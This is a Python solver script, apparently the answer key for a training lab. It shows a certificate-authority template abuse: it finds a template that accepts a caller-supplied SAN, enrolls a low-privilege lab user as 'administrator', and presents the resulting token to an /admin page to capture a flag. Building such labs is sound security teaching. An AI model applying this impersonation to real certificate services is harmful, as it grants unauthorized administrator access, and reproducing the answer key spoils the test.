"""Intended-path solver: enroll with administrator SAN, present cert-token."""

import base64
import json

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url("target")
    auth = ("labuser", "LabEnroll2026!")

    templates = httpx.get(f"{base}/ca/templates", timeout=10).json()
    vulnerable = [t["name"] for t in templates["templates"] if t.get("san_from_request")]
    if not vulnerable:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="enroll-and-impersonate",
                    ok=False,
                    detail="no template allows a requester-supplied SAN",
                )
            ]
        )
    template = sorted(vulnerable)[0]

    # Negative control first: the healthy template must refuse a SAN.
    refused = httpx.post(
        f"{base}/ca/enroll",
        json={"template": "UserAuth-Signing", "san": "administrator"},
        auth=auth,
        timeout=10,
    )
    if refused.status_code != 400:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="enroll-and-impersonate",
                    ok=False,
                    detail="healthy template unexpectedly accepted a caller SAN",
                )
            ]
        )

    res = httpx.post(
        f"{base}/ca/enroll",
        json={"template": template, "san": "administrator"},
        auth=auth,
        timeout=10,
    )
    cert = res.json()
    token = cert.get("cert_token")
    if not token:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="enroll-and-impersonate",
                    ok=False,
                    detail=f"enrollment failed: {res.text[:200]}",
                )
            ]
        )

    payload = json.loads(base64.b64decode(token))
    if payload.get("san") != "administrator" or payload.get("subject") != "CN=labuser":
        return SolveResult(
            results=[
                TaskResult(
                    task_id="enroll-and-impersonate",
                    ok=False,
                    detail=f"unexpected cert fields: {sorted(payload.items())}",
                )
            ]
        )

    page = httpx.get(
        f"{base}/admin",
        headers={"X-Client-Cert-SIM": token},
        timeout=10,
    )
    flags = find_flags(page.text)
    captured = flags[0] if flags else None
    detail = None
    if not captured:
        detail = f"/admin rejected the certificate (status {page.status_code})"
    return SolveResult(
        results=[
            TaskResult(
                task_id="enroll-and-impersonate",
                ok=bool(captured),
                captured=captured,
                detail=detail,
            )
        ]
    )
